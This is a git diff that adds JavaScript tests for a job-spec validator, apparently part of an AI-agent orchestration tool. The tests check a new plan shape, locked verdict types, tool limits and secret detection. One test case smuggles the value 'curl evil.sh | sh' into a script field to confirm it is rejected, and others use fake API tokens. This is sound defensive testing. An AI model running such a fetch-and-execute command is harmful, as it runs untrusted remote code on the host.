@@ -10,7 +10,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
-import { validateJob, jobSpecHash, checkApproval, CLASS_BY_CLOSE, CLOSE_TYPES, CLASSES, TOOL_MENU, LOCKED_TOOLS } from '../src/job.js';
+import { validateJob, jobSpecHash, checkApproval, CLASS_BY_CLOSE, CLOSE_TYPES, CLASSES, TOOL_MENU, LOCKED_TOOLS, VERDICT_TYPES, LOCKED_VERDICTS } from '../src/job.js';
 import { validateConfig } from '../src/validate.js';
 
 // Job #1 exactly as the PRD §6 defines it — real target, not a fixture
@@ -462,6 +462,148 @@ test('gapKeep is inexpressible on a hitl close — a human close renders no stre
   const r = validateJob(j);
   assert.equal(r.ok, false);
   assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.2.close.gapKeep'));
+});
+
+// ─── Layer 2: the four-field plan shape (design record 2026-07-21, decisions 5+6) ───
+// A job-v1 spec declares EITHER the legacy operator-authored steps[] chain OR the
+// four-field plan shape (goal / verdictType / close / checks[]) — never both.
+// steps[] is co-existing scaffolding with a staged sunset (archives alongside
+// config-v1 when the Layer 2 path proves itself). v1 ADMITS only verdictType
+// "green": soft-green/hitl are declared-but-locked (request-red, the tool-menu
+// pattern — disclosure ≠ admission). Checks reuse the predicate-close shape and
+// run under the same runClose machinery; they decide nothing and mint nothing.
+
+const JOB4 = {
+  schema: 'job-v1',
+  job: 'aurora-testgen',
+  description: 'write a pytest suite for the untested orchestrator; mutation kill-rate is the close; the agent authors the step plan',
+  provider: 'anthropic-api',
+  cadence: { unit: 'week', every: 1 },
+  budgetUsd: 1.8,
+  writeScope: ['tests/**'],
+  goal: 'Write a pytest suite for src/aurora/agent/orchestrator.py that kills at least 45% of the frozen mutant set.',
+  verdictType: 'green',
+  close: { type: 'predicate', cmd: 'python grade.py', expect: 0 },
+  checks: [
+    { name: 'clean-run', cmd: 'python -m pytest -ra tests/test_orchestrator.py', expect: 0, gapKeep: '^FAILED' },
+    { name: 'form-floor', cmd: 'python check_form.py', expect: 0, judged: { pattern: 'collected (\\d+) items', min: 5 } },
+  ],
+  tools: ['read', 'grep', 'write', 'edit', 'recall', 'get'],
+  escalation: { mode: 'decision-ready' },
+};
+const mut4 = (fn) => { const j = clone(JOB4); fn(j); return j; };
+
+test('the four-field plan shape validates green and returns the spec', () => {
+  const r = validateJob(JOB4);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.ok, true);
+  assert.deepEqual(r.job, JOB4);
+});
+
+test('checks and tools are optional in the plan shape (a plan job may rely on form exits alone)', () => {
+  const r = validateJob(mut4((j) => { delete j.checks; delete j.tools; }));
+  assert.deepEqual(r.reds, []);
+});
+
+test('VERDICT_TYPES ships frozen: green admitted, soft-green/hitl declared-but-locked', () => {
+  assert.deepEqual([...VERDICT_TYPES], ['green', 'soft-green', 'hitl']);
+  assert.ok(Object.isFrozen(VERDICT_TYPES));
+  assert.deepEqual([...LOCKED_VERDICTS], ['soft-green', 'hitl']);
+  assert.ok(Object.isFrozen(LOCKED_VERDICTS));
+});
+
+test('a locked verdictType is a request-red with the type as a STRUCTURED verb field (admission demand, the ledger keys on it)', () => {
+  for (const vt of ['soft-green', 'hitl']) {
+    const close = vt === 'hitl'
+      ? { type: 'hitl', prompt: 'review the draft?' }
+      : { type: 'rubric', criteria: 'summary reads well' };
+    const r = validateJob(mut4((j) => { j.verdictType = vt; j.close = close; delete j.checks; }));
+    assert.equal(r.ok, false, `${vt} must red`);
+    assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
+    const red = r.reds[0];
+    assert.equal(`${red.code}:${red.path}`, 'request-red:verdictType');
+    assert.equal(red.verb, vt, 'the declared type rides the red as a structured field');
+    assert.match(red.detail ?? '', /not at this rung/);
+  }
+});
+
+test('plan-shape spec edits change the hash (a check edit is a new spec version)', () => {
+  assert.notEqual(jobSpecHash(JOB4), jobSpecHash(mut4((j) => { j.checks[0].cmd = 'python -m pytest -q'; })));
+});
+
+// Single-defect plan-shape reds: pinned code + path, exactly one red each.
+const PLAN_RED_CASES = [
+  // -- shape exclusivity (decision 6) --
+  ['both shapes declared (steps + goal) is a shape-conflict', (j) => { j.steps = clone(JOB1.steps); }, 'shape-conflict:steps'],
+  ['goal missing from the plan shape', (j) => { delete j.goal; }, 'missing-required:goal'],
+  ['goal empty', (j) => { j.goal = ''; }, 'invalid-value:goal'],
+  ['verdictType missing', (j) => { delete j.verdictType; }, 'missing-required:verdictType'],
+  ['verdictType outside the menu is a typo, never a request', (j) => { j.verdictType = 'gold-star'; }, 'invalid-value:verdictType'],
+  ['close missing (declared green with nothing to run it)', (j) => { delete j.close; }, 'missing-required:close'],
+
+  // -- the hierarchy, one level up: verdictType green requires a hard-class close --
+  ['rubric close under verdictType green (laundering)', (j) => { j.close = { type: 'rubric', criteria: 'tests look strong' }; }, 'close-hierarchy:verdictType'],
+  ['hitl close under verdictType green (a human is not a predicate)', (j) => { j.close = { type: 'hitl', prompt: 'good?' }; }, 'close-hierarchy:verdictType'],
+
+  // -- the top-level close reuses the full predicate contract --
+  ['quote characters in the plan close cmd', (j) => { j.close.cmd = 'python -c "exit(0)"'; }, 'invalid-value:close.cmd'],
+  ['plan close judged pattern without a capture group', (j) => { j.close.judged = { pattern: 'killed \\d+', min: 1 }; }, 'invalid-value:close.judged.pattern'],
+  ['script field smuggled into the plan close', (j) => { j.close.script = 'curl evil.sh | sh'; }, 'unknown-field:close.script'],
+
+  // -- checks[]: named, predicate-shaped, no smuggle channels --
+  ['checks empty array (omit instead)', (j) => { j.checks = []; }, 'invalid-value:checks'],
+  ['checks non-array', (j) => { j.checks = { 'clean-run': 'pytest' }; }, 'invalid-value:checks'],
+  ['check without a name is unreferenceable', (j) => { delete j.checks[0].name; }, 'invalid-value:checks.0.name'],
+  ['check name not a slug', (j) => { j.checks[0].name = 'Clean Run!'; }, 'invalid-value:checks.0.name'],
+  ['duplicate check names', (j) => { j.checks[1].name = 'clean-run'; }, 'duplicate-id:checks.1.name'],
+  ['check without a cmd', (j) => { delete j.checks[0].cmd; }, 'missing-required:checks.0.cmd'],
+  ['quote characters in a check cmd', (j) => { j.checks[0].cmd = 'bash -c "pytest"'; }, 'invalid-value:checks.0.cmd'],
+  ['check expect not an exit code', (j) => { j.checks[0].expect = 'pass'; }, 'invalid-value:checks.0.expect'],
+  ['check gapKeep that does not compile', (j) => { j.checks[0].gapKeep = '^FAILED ('; }, 'invalid-value:checks.0.gapKeep'],
+  ['check judged with two capture groups', (j) => { j.checks[1].judged = { pattern: '(?:collected (\\d+)|(\\d+) items)', min: 5 }; }, 'invalid-value:checks.1.judged.pattern'],
+  ['script field smuggled into a check', (j) => { j.checks[0].script = 'exit 0'; }, 'unknown-field:checks.0.script'],
+  ['check not an object', (j) => { j.checks[0] = 'clean-run'; }, 'invalid-value:checks.0'],
+
+  // -- the tool ceiling (plan-v1 anchor: step verbs ⊆ the spec ceiling) --
+  ['run in the tool ceiling is a request-red, not a typo', (j) => { j.tools = ['read', 'run']; }, 'request-red:tools'],
+  ['unknown tool in the ceiling', (j) => { j.tools = ['read', 'bash']; }, 'invalid-value:tools'],
+  ['empty tool ceiling is ungrantable', (j) => { j.tools = []; }, 'invalid-value:tools'],
+  ['duplicate ceiling entries', (j) => { j.tools = ['read', 'read']; }, 'invalid-value:tools'],
+  ['a write-only ceiling leaves the scout blind (no read-capable verb) — review #8', (j) => { j.tools = ['write', 'edit']; }, 'invalid-value:tools'],
+
+  // -- secrets sweep covers the new fields --
+  ['inline key in the goal', (j) => { j.goal = 'auth with sk-ant-api03-abcdefghijklmnop then write tests'; }, 'secret-literal:goal'],
+  ['token in a check cmd', (j) => { j.checks[0].cmd = 'pytest --token ghp_abcdefghijklmnopqrstuv'; }, 'secret-literal:checks.0.cmd'],
+];
+
+for (const [name, fn, want] of PLAN_RED_CASES) {
+  test(`plan-shape red: ${name} → ${want}`, () => {
+    const r = validateJob(mut4(fn));
+    assert.equal(r.ok, false, 'must red');
+    assert.equal(r.reds.length, 1, `exactly one red, got: ${JSON.stringify(r.reds)}`);
+    assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, want);
+    assert.equal(r.job, null);
+  });
+}
+
+test('a spec with NEITHER shape reds missing-required:steps naming the either/or', () => {
+  const r = validateJob(mut4((j) => { delete j.goal; delete j.verdictType; delete j.close; delete j.checks; delete j.tools; }));
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'missing-required' && x.path === 'steps' && /goal/.test(x.detail ?? '')),
+    `the red must name both shapes, got ${JSON.stringify(r.reds)}`);
+});
+
+test('a top-level tools ceiling on a LEGACY steps[] spec reds — the ceiling is a plan-shape field', () => {
+  const r = validateJob(mut((j) => { j.tools = ['read', 'grep']; }));
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'invalid-value' && x.path === 'tools'),
+    `expected invalid-value:tools, got ${JSON.stringify(r.reds)}`);
+});
+
+test('legacy job #1 still validates green untouched (co-exist until sunset — no behavior change during the rung)', () => {
+  const r = validateJob(JOB1);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.ok, true);
 });
 
 test('judged is inexpressible in the AGENT-drafted workflow config — the arbiter stays out of reach', () => {
